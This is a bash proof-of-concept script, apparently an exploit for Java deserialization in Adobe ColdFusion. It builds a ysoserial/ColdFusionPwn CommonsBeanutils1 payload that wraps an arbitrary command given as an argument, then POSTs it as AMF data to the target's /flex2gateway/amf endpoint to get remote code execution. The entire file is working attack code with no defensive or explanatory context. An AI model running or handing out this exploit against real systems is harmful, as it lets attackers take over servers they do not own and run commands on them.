#!/usr/bin/env bash

BASEURL=$1
CMD=$2

rm -f poc.ser
echo '[~]Â Generate serialized payload...'
java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:../ysoserial-0.0.6-SNAPSHOT-BETA-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 "$CMD" poc.ser

echo '[~] Send serialized payload as HTTP POST data...'
curl -X POST --header 'Content-Type: application/x-amf' --data-binary '@poc.ser' ${BASEURL}/flex2gateway/amf
sleep 2
rm -f poc.ser